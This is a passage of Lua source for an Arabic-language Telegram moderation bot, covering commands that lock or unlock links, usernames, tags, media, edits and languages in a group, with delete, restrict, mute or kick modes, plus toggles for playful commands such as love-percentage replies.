elseif text == 'قفل الانلاين' and msg.reply_to_message_id_ == 0 and Manager(msg) then 
database:set(bot_id.."lock:inline"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ♤  مـن قبـل  ⇦♤[♤'..Rutba(msg.sender_user_id_,msg.chat_id_)..'♤](T.ME/'..(data.username_ or 'textchuser')..') \n ♤ تـم قفـل الانلاين ')
end,nil)
elseif text == 'قفل تعديل الميديا' and msg.reply_to_message_id_ == 0 and Constructor(msg) then 
database:set(bot_id..'lock_edit_med'..msg.chat_id_,true) 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ♤  مـن قبـل  ⇦♤[♤'..Rutba(msg.sender_user_id_,msg.chat_id_)..'♤](T.ME/'..(data.username_ or 'textchuser')..') \n ♤ تـم قفـل تعديل ')
end,nil)    
elseif text == 'قفل الكل' and msg.reply_to_message_id_ == 0 and Mod(msg) then 
database:set(bot_id..'lock:tagservrbot'..msg.chat_id_,true)   
list ={"lock:Bot:kick","lock:user:name","lock:hashtak","lsock:Cmd","lock:Link","lock:forward","lock:Keyboard","lock:geam","lock:Photo","lock:Animation","lock:Video","lock:Audio","lock:vico","lock:Sticker","lock:Document","lock:Unsupported","lock:Markdaun","lock:Contact","lock:Spam"}
for i,lock in pairs(list) do 
database:set(bot_id..lock..msg.chat_id_,'del')    
end
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ♤  مـن قبـل  ⇦♤[♤'..Rutba(msg.sender_user_id_,msg.chat_id_)..'♤](T.ME/'..(data.username_ or 'textchuser')..') \n ♤ تـم قفـل جميع الاوامر ')
end,nil)   
end
if text == 'قفل الاباحي' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Lock:Sexy"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ♤  مـن قبـل  ⇦♤[♤'..Rutba(msg.sender_user_id_,msg.chat_id_)..'♤](T.ME/'..(data.username_ or 'textchuser')..') \n ♤ تـم قفـل الاباحي ')
end,nil)   
elseif text == 'فتح الاباحي' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:del(bot_id.."lock:Lock:Sexy"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ♤  مـن قبـل  ⇦♤[♤'..Rutba(msg.sender_user_id_,msg.chat_id_)..'♤](T.ME/'..(data.username_ or 'textchuser')..') \n ♤ تـم فتح الاباحي ')
end,nil)   
end
if text == 'فتح الانلاين' and msg.reply_to_message_id_ == 0 and Mod(msg) then 
database:del(bot_id.."lock:inline"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ♤  مـن قبـل  ⇦♤[♤'..Rutba(msg.sender_user_id_,msg.chat_id_)..'♤](T.ME/'..(data.username_ or 'textchuser')..') \n ♤ تـم فتح الانلاين ')
end,nil)
elseif text == 'فتح الاضافه' and msg.reply_to_message_id_ == 0 and Mod(msg) then 
database:del(bot_id.."lock:AddMempar"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ♤  مـن قبـل  ⇦♤[♤'..Rutba(msg.sender_user_id_,msg.chat_id_)..'♤](T.ME/'..(data.username_ or 'textchuser')..') \n ♤ تـم فتح اضافة ')
end,nil)   
elseif text == 'فتح الدردشه' and msg.reply_to_message_id_ == 0 and Manager(msg) then 
database:del(bot_id.."lock:text"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ♤  مـن قبـل  ⇦♤[♤'..Rutba(msg.sender_user_id_,msg.chat_id_)..'♤](T.ME/'..(data.username_ or 'textchuser')..') \n ♤ تـم فتح الدردشه ')
end,nil)   
elseif text == 'فتح الدخول' and msg.reply_to_message_id_ == 0 and Mod(msg) then 
database:del(bot_id.."lock:Join"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ♤  مـن قبـل  ⇦♤[♤'..Rutba(msg.sender_user_id_,msg.chat_id_)..'♤](T.ME/'..(data.username_ or 'textchuser')..') \n ♤ تـم فتح دخول ')
end,nil)   
elseif text == 'فتح البوتات' and msg.reply_to_message_id_ == 0 and Mod(msg) then 
database:del(bot_id.."lock:Bot:kick"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ♤  مـن قبـل  ⇦♤[♤'..Rutba(msg.sender_user_id_,msg.chat_id_)..'♤](T.ME/'..(data.username_ or 'textchuser')..') \n ♤ تـم فـتح البوتات ')
end,nil)   
elseif text == 'فتح البوتات بالطرد' and msg.reply_to_message_id_ == 0 and Mod(msg) then 
database:del(bot_id.."lock:Bot:kick"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ♤  مـن قبـل  ⇦♤[♤'..Rutba(msg.sender_user_id_,msg.chat_id_)..'♤](T.ME/'..(data.username_ or 'textchuser')..') \n ♤ تـم فـتح البوتات بالطرد ')
end,nil)   
elseif text == 'فتح الاشعارات' and msg.reply_to_message_id_ == 0 and Mod(msg) then  
database:del(bot_id..'lock:tagservr'..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ♤  مـن قبـل  ⇦♤[♤'..Rutba(msg.sender_user_id_,msg.chat_id_)..'♤](T.ME/'..(data.username_ or 'textchuser')..') \n ♤ تـم فـتح الاشعارات ')
end,nil)   
elseif text == 'فتح التثبيت' and msg.reply_to_message_id_ == 0 and Constructor(msg) then 
database:del(bot_id.."lockpin"..msg.chat_id_)  
database:srem(bot_id..'lock:pin',msg.chat_id_)
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ♤  مـن قبـل  ⇦♤[♤'..Rutba(msg.sender_user_id_,msg.chat_id_)..'♤](T.ME/'..(data.username_ or 'textchuser')..') \n ♤ تـم فـتح التثبيت ')
end,nil)   
elseif text == 'فتح التعديل' and msg.reply_to_message_id_ == 0 and Constructor(msg) then 
database:del(bot_id..'lock:edit'..msg.chat_id_) 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ♤  مـن قبـل  ⇦♤[♤'..Rutba(msg.sender_user_id_,msg.chat_id_)..'♤](T.ME/'..(data.username_ or 'textchuser')..') \n ♤ تـم فـتح تعديل ')
end,nil)   
elseif text == 'فتح السب' and msg.reply_to_message_id_ == 0 and Manager(msg) then 
database:del(bot_id..'lock:Fshar'..msg.chat_id_) 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ♤  مـن قبـل  ⇦♤[♤'..Rutba(msg.sender_user_id_,msg.chat_id_)..'♤](T.ME/'..(data.username_ or 'textchuser')..') \n ♤ تـم فـتح السب ')
end,nil)   
elseif text == 'فتح الازعاج' and msg.reply_to_message_id_ == 0 and Manager(msg) then 
database:del(bot_id..'lock:Azag'..msg.chat_id_) 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ♤  مـن قبـل  ⇦♤[♤'..Rutba(msg.sender_user_id_,msg.chat_id_)..'♤](T.ME/'..(data.username_ or 'textchuser')..') \n ♤ تـم فـتح السب ')
end,nil)   
elseif text == 'فتح الفارسيه' and msg.reply_to_message_id_ == 0 and Manager(msg) then 
database:del(bot_id..'lock:Fars'..msg.chat_id_) 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ♤  مـن قبـل  ⇦♤[♤'..Rutba(msg.sender_user_id_,msg.chat_id_)..'♤](T.ME/'..(data.username_ or 'textchuser')..') \n ♤ تـم فـتح الفارسيه ')
end,nil)   
elseif text == 'فتح الانكليزيه' and msg.reply_to_message_id_ == 0 and Manager(msg) then 
database:del(bot_id..'lock:Engilsh'..msg.chat_id_) 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ♤  مـن قبـل  ⇦♤[♤'..Rutba(msg.sender_user_id_,msg.chat_id_)..'♤](T.ME/'..(data.username_ or 'textchuser')..') \n ♤ تـم فـتح الانكليزيه ')
end,nil)
elseif text == 'فتح تعديل الميديا' and msg.reply_to_message_id_ == 0 and Constructor(msg) then 
database:del(bot_id..'lock_edit_med'..msg.chat_id_) 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ♤  مـن قبـل  ⇦♤[♤'..Rutba(msg.sender_user_id_,msg.chat_id_)..'♤](T.ME/'..(data.username_ or 'textchuser')..') \n ♤ تـم فـتح تعديل ')
end,nil)    
elseif text == 'فتح الكل' and msg.reply_to_message_id_ == 0 and Mod(msg) then 
database:del(bot_id..'lock:tagservrbot'..msg.chat_id_)   
list ={"lock:Bot:kick","lock:user:name","lock:hashtak","lock:Cmd","lock:Link","lock:forward","lock:Keyboard","lock:geam","lock:Photo","lock:Animation","lock:Video","lock:Audio","lock:vico","lock:Sticker","lock:Document","lock:Unsupported","lock:Markdaun","lock:Contact","lock:Spam"}
for i,lock in pairs(list) do 
database:del(bot_id..lock..msg.chat_id_)    
end
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ♤  مـن قبـل  ⇦♤[♤'..Rutba(msg.sender_user_id_,msg.chat_id_)..'♤](T.ME/'..(data.username_ or 'textchuser')..') \n ♤ تـم فـتح جميع الاوامر ')
end,nil)   
end
if text == 'قفل الروابط' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Link"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ♤  مـن قبـل  ⇦♤[♤'..Rutba(msg.sender_user_id_,msg.chat_id_)..'♤](T.ME/'..(data.username_ or 'textchuser')..') \n ♤ تـم قفـل الروابط ')
end,nil)   
elseif text == 'قفل الروابط بالتقييد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Link"..msg.chat_id_,'ked')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ♤  مـن قبـل  ⇦♤[♤'..Rutba(msg.sender_user_id_,msg.chat_id_)..'♤](T.ME/'..(data.username_ or 'textchuser')..') \n ♤ تـم قفـل الروابط بالتقييد ')
end,nil)   
elseif text == 'قفل الروابط بالكتم' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Link"..msg.chat_id_,'ktm')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ♤  مـن قبـل  ⇦♤[♤'..Rutba(msg.sender_user_id_,msg.chat_id_)..'♤](T.ME/'..(data.username_ or 'textchuser')..') \n ♤ تـم قفـل الروابط بالكتم ')
end,nil)   
elseif text == 'قفل الروابط بالطرد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Link"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ♤  مـن قبـل  ⇦♤[♤'..Rutba(msg.sender_user_id_,msg.chat_id_)..'♤](T.ME/'..(data.username_ or 'textchuser')..') \n ♤ تـم قفـل الروابط بالطرد ')
end,nil)   
elseif text == 'فتح الروابط' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:del(bot_id.."lock:Link"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ♤  مـن قبـل  ⇦♤[♤'..Rutba(msg.sender_user_id_,msg.chat_id_)..'♤](T.ME/'..(data.username_ or 'textchuser')..') \n ♤ تـم فتح الروابط ')
end,nil)   
end
if text == 'قفل المعرفات' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:user:name"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ♤  مـن قبـل  ⇦♤[♤'..Rutba(msg.sender_user_id_,msg.chat_id_)..'♤](T.ME/'..(data.username_ or 'textchuser')..') \n ♤ تـم قفـل المعرفات ')
end,nil)   
elseif text == 'قفل المعرفات بالتقييد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:user:name"..msg.chat_id_,'ked')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ♤  مـن قبـل  ⇦♤[♤'..Rutba(msg.sender_user_id_,msg.chat_id_)..'♤](T.ME/'..(data.username_ or 'textchuser')..') \n ♤ تـم قفـل المعرفات بالتقييد ')
end,nil)   
elseif text == 'قفل المعرفات بالكتم' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:user:name"..msg.chat_id_,'ktm')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ♤  مـن قبـل  ⇦♤[♤'..Rutba(msg.sender_user_id_,msg.chat_id_)..'♤](T.ME/'..(data.username_ or 'textchuser')..') \n ♤ تـم قفـل المعرفات بالكتم ')
end,nil)   
elseif text == 'قفل المعرفات بالطرد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:user:name"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ♤  مـن قبـل  ⇦♤[♤'..Rutba(msg.sender_user_id_,msg.chat_id_)..'♤](T.ME/'..(data.username_ or 'textchuser')..') \n ♤ تـم قفـل المعرفات بالطرد ')
end,nil)   
elseif text == 'فتح المعرفات' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:del(bot_id.."lock:user:name"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ♤  مـن قبـل  ⇦♤[♤'..Rutba(msg.sender_user_id_,msg.chat_id_)..'♤](T.ME/'..(data.username_ or 'textchuser')..') \n ♤ تـم فتح المعرفات ')
end,nil)   
end
if text == 'تفعيل غنيلي' and CoSu(msg) then   
if database:get(bot_id..'sing:for:me'..msg.chat_id_) then
Text = ' ♤ تم تفعيل امر غنيلي الان ارسل غنيلي'
database:del(bot_id..'sing:for:me'..msg.chat_id_)  
else
Text = ' ♤ بالتاكيد تم تفعيل امر غنيلي تستطيع ارسال غنيلي'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تعطيل غنيلي' and CoSu(msg) then  
if not database:get(bot_id..'sing:for:me'..msg.chat_id_) then
database:set(bot_id..'sing:for:me'..msg.chat_id_,true)  
Text = '\n ♤ تم تعطيل امر غنيلي'
else
Text = '\n ♤ بالتاكيد تم تعطيل امر غنيلي'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تفعيل نسبه الحب' and Manager(msg) then   
if database:get(bot_id..'Cick:lov'..msg.chat_id_) then
Text = ' ♤ تم تفعيل نسبه الحب'
database:del(bot_id..'Cick:lov'..msg.chat_id_)  
else
Text = ' ♤ بالتاكيد تم تفعيل نسبه الحب'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تعطيل نسبه الحب' and Manager(msg) then  
if not database:get(bot_id..'Cick:lov'..msg.chat_id_) then
database:set(bot_id..'Cick:lov'..msg.chat_id_,true)  
Text = '\n ♤ تم تعطيل نسبه الحب'
else
Text = '\n ♤ بالتاكيد تم تعطيل نسبه الحب'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تفعيل نسبه الرجوله' and Manager(msg) then   
if database:get(bot_id..'Cick:rjo'..msg.chat_id_) then
Text = ' ♤ تم تفعيل نسبه الرجوله'
database:del(bot_id..'Cick:rjo'..msg.chat_id_)  
else
Text = ' ♤ بالتاكيد تم تفعيل الرجوله'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تعطيل نسبه الرجوله' and Manager(msg) then  
if not database:get(bot_id..'Cick:rjo'..msg.chat_id_) then
database:set(bot_id..'Cick:rjo'..msg.chat_id_,true)  
Text = '\n ♤ تم تعطيل نسبه الرجوله'
else
Text = '\n ♤ بالتاكيد تم تعطيل نسبه الرجوله'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تفعيل نسبه الكره' and Manager(msg) then   
if database:get(bot_id..'Cick:krh'..msg.chat_id_) then
Text = ' ♤ تم تفعيل نسبه الكره'
database:del(bot_id..'Cick:krh'..msg.chat_id_)  
else
Text = ' ♤ بالتاكيد تم تفعيل نسبه الكره'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تعطيل نسبه الكره' and Manager(msg) then  
if not database:get(bot_id..'Cick:krh'..msg.chat_id_) then
database:set(bot_id..'Cick:krh'..msg.chat_id_,true)  
Text = '\n ♤ تم تعطيل نسبه الكره'
else
Text = '\n ♤ بالتاكيد تم تعطيل نسبه الكره'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تفعيل نسبه الانوثه' and Manager(msg) then   
if database:get(bot_id..'Cick:ano'..msg.chat_id_) then
Text = ' ♤ تم تفعيل نسبه الانوثه'
database:del(bot_id..'Cick:ano'..msg.chat_id_)  
else
Text = ' ♤ بالتاكيد تم تفعيل الانوثه'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تعطيل نسبه الانوثه' and Manager(msg) then  
if not database:get(bot_id..'Cick:ano'..msg.chat_id_) then
database:set(bot_id..'Cick:ano'..msg.chat_id_,true)  
Text = '\n ♤ تم تعطيل نسبه الانوثه'
else
Text = '\n ♤ بالتاكيد تم تعطيل نسبه الانوثه'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تفعيل all' and CoSu(msg) then   
if database:get(bot_id..'Cick:all'..msg.chat_id_) then
Text = ' ♤ تم تفعيل امر @all'
database:del(bot_id..'Cick:all'..msg.chat_id_)  
else
Text = ' ♤ بالتاكيد تم تفعيل امر @all'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تعطيل all' and CoSu(msg) then  
if not database:get(bot_id..'Cick:all'..msg.chat_id_) then
database:set(bot_id..'Cick:all'..msg.chat_id_,true)  
Text = '\n ♤ تم تعطيل امر @all'
else
Text = '\n ♤ بالتاكيد تم تعطيل امر @all'
end
send(msg.chat_id_, msg.id_,Text) 
end

if text == 'قفل التاك' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:hashtak"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ♤  مـن قبـل  ⇦♤[♤'..Rutba(msg.sender_user_id_,msg.chat_id_)..'♤](T.ME/'..(data.username_ or 'textchuser')..') \n ♤ تـم قفـل التاك ')
end,nil)   
elseif text == 'قفل التاك بالتقييد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:hashtak"..msg.chat_id_,'ked')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ♤  مـن قبـل  ⇦♤[♤'..Rutba(msg.sender_user_id_,msg.chat_id_)..'♤](T.ME/'..(data.username_ or 'textchuser')..') \n ♤ تـم قفـل التاك بالتقييد ')
end,nil)   
elseif text == 'قفل التاك بالكتم' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:hashtak"..msg.chat_id_,'ktm')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ♤  مـن قبـل  ⇦♤['..string.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'textchuser')..') \n ♤ تـم قفـل التاك بالكتم ')
end,nil)   
elseif text == 'قفل التاك بالطرد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:hashtak"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ♤  مـن قبـل  ⇦♤[♤'..Rutba(msg.sender_user_id_,msg.chat_id_)..'♤](T.ME/'..(data.username_ or 'textchuser')..') \n ♤ تـم قفـل التاك بالطرد ')
end,nil)   
elseif text == 'فتح التاك' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:del(bot_id.."lock:hashtak"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ♤  مـن قبـل  ⇦♤[♤'..Rutba(msg.sender_user_id_,msg.chat_id_)..'♤](T.ME/'..(data.username_ or 'textchuser')..') \n ♤ تـم فتح التاك ')
end,nil)   
end
if text == 'قفل الشارحه' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Cmd"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ♤  مـن قبـل  ⇦♤[♤'..Rutba(msg.sender_user_id_,msg.chat_id_)..'♤](T.ME/'..(data.username_ or 'textchuser')..') \n ♤ تـم قفـل الشارحه ')
end,nil)   
elseif text == 'قفل الشارحه بالتقييد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Cmd"..msg.chat_id_,'ked')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ♤  مـن قبـل  ⇦♤[♤'..Rutba(msg.sender_user_id_,msg.chat_id_)..'♤](T.ME/'..(data.username_ or 'textchuser')..') \n ♤ تـم قفـل الشارحه بالتقييد ')
end,nil)   
elseif text == 'قفل الشارحه بالكتم' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Cmd"..msg.chat_id_,'ktm')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ♤  مـن قبـل  ⇦♤[♤'..Rutba(msg.sender_user_id_,msg.chat_id_)..'♤](T.ME/'..(data.username_ or 'textchuser')..') \n ♤ تـم قفـل الشارحه بالكتم ')
end,nil)   
elseif text == 'قفل الشارحه بالطرد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Cmd"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ♤  مـن قبـل  ⇦♤[♤'..Rutba(msg.sender_user_id_,msg.chat_id_)..'♤](T.ME/'..(data.username_ or 'textchuser')..') \n ♤ تـم قفـل الشارحه بالطرد ')
end,nil)   
elseif text == 'فتح الشارحه' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:del(bot_id.."lock:Cmd"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ♤  مـن قبـل  ⇦♤[♤'..Rutba(msg.sender_user_id_,msg.chat_id_)..'♤](T.ME/'..(data.username_ or 'textchuser')..') \n ♤ تـم فتح الشارحه ')
end,nil)   
end
if text == 'قفل الصور'and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Photo"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ♤  مـن قبـل  ⇦♤[♤'..Rutba(msg.sender_user_id_,msg.chat_id_)..'♤](T.ME/'..(data.username_ or 'textchuser')..') \n ♤ تـم قفـل الصور ')
end,nil)   
elseif text == 'قفل الصور بالتقييد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Photo"..msg.chat_id_,'ked')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ♤  مـن قبـل  ⇦♤[♤'..Rutba(msg.sender_user_id_,msg.chat_id_)..'♤](T.ME/'..(data.username_ or 'textchuser')..') \n ♤ تـم قفـل الصور بالتقييد ')
end,nil)   
elseif text == 'قفل الصور بالكتم' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Photo"..msg.chat_id_,'ktm')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ♤  مـن قبـل  ⇦♤[♤'..Rutba(msg.sender_user_id_,msg.chat_id_)..'♤](T.ME/'..(data.username_ or 'textchuser')..') \n ♤ تـم قفـل الصور بالكتم ')
end,nil)   
elseif text == 'قفل الصور بالطرد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Photo"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ♤  مـن قبـل  ⇦♤[♤'..Rutba(msg.sender_user_id_,msg.chat_id_)..'♤](T.ME/'..(data.username_ or 'textchuser')..') \n ♤ تـم قفـل الصور بالطرد ')
end,nil)   
elseif text == 'فتح الصور' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:del(bot_id.."lock:Photo"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ♤  مـن قبـل  ⇦♤[♤'..Rutba(msg.sender_user_id_,msg.chat_id_)..'♤](T.ME/'..(data.username_ or 'textchuser')..') \n ♤ تـم فتح الصور ')
end,nil)   
end
if text == 'قفل الفيديو' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Video"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ♤  مـن قبـل  ⇦♤[♤'..Rutba(msg.sender_user_id_,msg.chat_id_)..'♤](T.ME/'..(data.username_ or 'textchuser')..') \n ♤ تـم قفـل الفيديو ')
end,nil)   
elseif text == 'قفل الفيديو بالتقييد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Video"..msg.chat_id_,'ked')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ♤  مـن قبـل  ⇦♤[♤'..Rutba(msg.sender_user_id_,msg.chat_id_)..'♤](T.ME/'..(data.username_ or 'textchuser')..') \n ♤ تـم قفـل الفيديو بالتقييد ')
end,nil)   
elseif text == 'قفل الفيديو بالكتم' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Video"..msg.chat_id_,'ktm')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ??  مـن قبـل  ⇦♤[♤'..Rutba(msg.sender_user_id_,msg.chat_id_)..'♤](T.ME/'..(data.username_ or 'textchuser')..') \n ♤ تـم قفـل الفيديو بالكتم ')
end,nil)   
elseif text == 'قفل الفيديو بالطرد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Video"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ♤  مـن قبـل  ⇦♤[♤'..Rutba(msg.sender_user_id_,msg.chat_id_)..'♤](T.ME/'..(data.username_ or 'textchuser')..') \n ♤ تـم قفـل الفيديو بالطرد ')
end,nil)   
elseif text == 'فتح الفيديو' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:del(bot_id.."lock:Video"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ♤  مـن قبـل  ⇦♤[♤'..Rutba(msg.sender_user_id_,msg.chat_id_)..'♤](T.ME/'..(data.username_ or 'textchuser')..') \n ♤ تـم فتح الفيديو ')
end,nil)   
end
if text == 'قفل المتحركه' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Animation"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ♤  مـن قبـل  ⇦♤[♤'..Rutba(msg.sender_user_id_,msg.chat_id_)..'♤](T.ME/'..(data.username_ or 'textchuser')..') \n ♤ تـم قفـل المتحركه ')
end,nil)   
